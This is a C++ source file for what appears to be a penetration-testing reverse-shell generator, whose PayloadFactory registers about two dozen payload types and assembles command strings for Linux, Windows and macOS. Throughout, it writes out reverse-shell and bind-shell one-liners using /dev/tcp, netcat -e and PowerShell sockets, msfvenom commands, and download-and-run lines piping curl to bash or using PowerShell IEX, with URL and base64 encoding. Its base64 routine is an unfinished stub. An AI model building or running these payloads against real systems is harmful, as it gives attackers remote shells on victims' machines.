#include "PayloadFactory.h"
#include "../listeners/ListenerFactory.h"
#include "implementations/Bash_I_Payload.h"
#include "implementations/Bash_196_Payload.h"
#include "implementations/Bash_RL_Payload.h"
#include "implementations/Bash_5_Payload.h"
#include "implementations/Nc_Mkfifo_Payload.h"
#include "implementations/Nc_E_Payload.h"
#include "implementations/Nc_Exe_Payload.h"
#include "implementations/Busybox_Nc_Payload.h"
#include "implementations/Nc_C_Payload.h"
#include "implementations/Ncat_E_Payload.h" 
#include "implementations/Ncat_Exe_E_Payload.h"
#include "implementations/Ncat_UDP_Payload.h"
#include "implementations/Curl_Payload.h"
#include "implementations/Rustcat_Payload.h"
#include "implementations/C_Payload.h"
#include "implementations/C_Windows_Payload.h"
#include "implementations/C_Sharp_TCP_Client_Payload.h"
#include "implementations/C_Sharp_Bash_I_Payload.h"
#include "implementations/Haskell_Payload.h"   
#include "implementations/OpenSSL_Payload.h" 
#include "implementations/Perl_Payload.h"
#include "implementations/Perl_No_Sh_Payload.h"
#include "implementations/Perl_PentestMonkey_Payload.h"
#include "implementations/PHP_PentestMonkey_Payload.h"
#include <sstream>
#include <iomanip>
#include <algorithm>

PayloadFactory::PayloadFactory() {
    // Register payload types - you can add more here
    // registry_["bash"] = std::make_unique<BashPayload>();
    // registry_["sh"] = std::make_unique<ShPayload>();
    // registry_["zsh"] = std::make_unique<ZshPayload>();
    // registry_["powershell"] = std::make_unique<PowershellPayload>();
    // etc.
    registry_["bash_i"] = std::make_unique<BashIPayload>();
    registry_["bash_196"] = std::make_unique<Bash196Payload>();
    registry_["bash_rl"] = std::make_unique<BashRLPayload>();
    registry_["bash_5"] = std::make_unique<Bash5Payload>();
    registry_["nc_mkfifo"] = std::make_unique<NcMkfifoPayload>();
    registry_["nc_e"] = std::make_unique<NcEPayload>();
    registry_["nc_exe"] = std::make_unique<NcExePayload>();
    registry_["busybox_nc"] = std::make_unique<BusyboxNcPayload>();
    registry_["nc_c"] = std::make_unique<NcCPayload>();
    registry_["ncat_e"] = std::make_unique<NcatEPayload>();
    registry_["ncat_exe_e"] = std::make_unique<NcatExeEPayload>();
    registry_["ncat_udp"] = std::make_unique<NcatUDPPayload>();
    registry_["curl"] = std::make_unique<CurlPayload>();
    registry_["rustcat"] = std::make_unique<RustcatPayload>();
    registry_["c"] = std::make_unique<CPayload>();
    registry_["c_windows"] = std::make_unique<CWindowsPayload>();
    registry_["c_sharp_tcp_client"] = std::make_unique<CSharpTCPClientPayload>();
    registry_["c_sharp_bash_i"] = std::make_unique<CSharpBashIPayload>();
    registry_["haskell"] = std::make_unique<HaskellPayload>();
    registry_["openssl"] = std::make_unique<OpenSSLPayload>();
    registry_["perl"] = std::make_unique<PerlPayload>();
    registry_["perl_no_sh"] = std::make_unique<PerlNoShPayload>();
    registry_["perl_pentestmonkey"] = std::make_unique<PerlPentestMonkeyPayload>();
    registry_["php_pentestmonkey"] = std::make_unique<PHPPentestMonkeyPayload>();
}

std::vector<std::string> PayloadFactory::available() const {
    std::vector<std::string> names;
    names.reserve(registry_.size());
    for (const auto& kv : registry_) {
        names.push_back(kv.first);
    }
    return names;
}

std::string PayloadFactory::generateByType(const Options& opts) const {
    std::string payload;
    
    // Generate based on platform and payload type
    switch (opts.platform) {
        case Platform::LINUX:
            payload = generateLinuxPayload(opts);
            break;
        case Platform::WINDOWS:
            payload = generateWindowsPayload(opts);
            break;
        case Platform::MAC:
            payload = generateMacPayload(opts);
            break;
    }
    
    // Apply encoding
    return applyEncoding(payload, opts);
}

std::string PayloadFactory::generateLinuxPayload(const Options& opts) const {
    std::string shell = opts.interpreter.empty() ? "bash" : opts.interpreter;
    
    switch (opts.payloadType) {
        case PayloadType::REVERSE:
            // Example: bash -i >& /dev/tcp/IP/PORT 0>&1
            return shell + " -i >& /dev/tcp/" + opts.host + "/" + std::to_string(opts.port) + " 0>&1";
            
        case PayloadType::BIND:
            // Example: nc -lvnp PORT -e /bin/bash
            return "nc -lvnp " + std::to_string(opts.port) + " -e /bin/" + shell;
            
        case PayloadType::MSFVENOM:
            // Example: msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f elf
            return "msfvenom -p linux/x64/shell_reverse_tcp LHOST=" + opts.host + 
                   " LPORT=" + std::to_string(opts.port) + " -f elf";
                   
        case PayloadType::HOAXSHELL:
            // Example: curl -s IP:PORT/shell | bash
            return "curl -s " + opts.host + ":" + std::to_string(opts.port) + "/shell | " + shell;
    }
    return "";
}

std::string PayloadFactory::generateWindowsPayload(const Options& opts) const {
    switch (opts.payloadType) {
        case PayloadType::REVERSE:
            // Example: powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('IP',PORT)..."
            return "powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('" + 
                   opts.host + "'," + std::to_string(opts.port) + ");$stream = $client.GetStream()...\"";
                   
        case PayloadType::BIND:
            // Example: nc -lvnp PORT -e cmd.exe
            return "nc -lvnp " + std::to_string(opts.port) + " -e cmd.exe";
            
        case PayloadType::MSFVENOM:
            // Example: msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f exe
            return "msfvenom -p windows/x64/shell_reverse_tcp LHOST=" + opts.host + 
                   " LPORT=" + std::to_string(opts.port) + " -f exe";
                   
        case PayloadType::HOAXSHELL:
            // Example: powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://IP:PORT/shell')"
            return "powershell -c \"IEX(New-Object Net.WebClient).DownloadString('http://" + 
                   opts.host + ":" + std::to_string(opts.port) + "/shell')\"";
    }
    return "";
}

std::string PayloadFactory::generateMacPayload(const Options& opts) const {
    std::string shell = opts.interpreter.empty() ? "bash" : opts.interpreter;
    
    switch (opts.payloadType) {
        case PayloadType::REVERSE:
            // Example: bash -i >& /dev/tcp/IP/PORT 0>&1
            return shell + " -i >& /dev/tcp/" + opts.host + "/" + std::to_string(opts.port) + " 0>&1";
            
        case PayloadType::BIND:
            // Example: nc -lvnp PORT -e /bin/bash
            return "nc -lvnp " + std::to_string(opts.port) + " -e /bin/" + shell;
            
        case PayloadType::MSFVENOM:
            // Example: msfvenom -p osx/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f macho
            return "msfvenom -p osx/x64/shell_reverse_tcp LHOST=" + opts.host + 
                   " LPORT=" + std::to_string(opts.port) + " -f macho";
                   
        case PayloadType::HOAXSHELL:
            // Example: curl -s IP:PORT/shell | bash
            return "curl -s " + opts.host + ":" + std::to_string(opts.port) + "/shell | " + shell;
    }
    return "";
}

std::string PayloadFactory::applyEncoding(const std::string& payload, const Options& opts) const {
    switch (opts.encoding) {
        case Encoding::BASE64:
            return base64Encode(payload);
        case Encoding::URL:
            return urlEncode(payload);
        case Encoding::DOUBLE_URL:
            return doubleUrlEncode(payload);
        case Encoding::NONE:
        default:
            return payload;
    }
}

std::string PayloadFactory::base64Encode(const std::string& input) const {
    // TODO: Implement base64 encoding
    // You can use a library like boost::beast::detail::base64 or implement your own
    return "echo '" + input + "' | base64";
}

std::string PayloadFactory::urlEncode(const std::string& input) const {
    std::ostringstream encoded;
    encoded.fill('0');
    encoded << std::hex;
    
    for (char c : input) {
        if (std::isalnum(c) || c == '-' || c == '_' || c == '.' || c == '~') {
            encoded << c;
        } else {
            encoded << '%' << std::setw(2) << std::uppercase << static_cast<unsigned char>(c);
        }
    }
    
    return encoded.str();
}

std::string PayloadFactory::doubleUrlEncode(const std::string& input) const {
    return urlEncode(urlEncode(input));
}

std::vector<std::string> PayloadFactory::getSupportedShells() const {
    return {"sh", "/bin/sh", "bash", "/bin/bash", "cmd", "powershell", "pwsh", "ash", "bsh", "csh", "ksh", "zsh", "pdksh", "tcsh", "mksh", "dash"};
}

std::vector<std::string> PayloadFactory::getSupportedEncodings() const {
    return {"none", "base64", "url", "double_url"};
}

std::string PayloadFactory::listener(const std::string& type, const Options& opts) const {
    // Use existing ListenerFactory
    ListenerFactory listenerFactory;
    IListener* listener = listenerFactory.get(opts.listenerType);
    
    if (!listener) {
        // Default fallback
        return "nc -lvnp " + std::to_string(opts.port);
    }
    
    return listener->command(opts);
}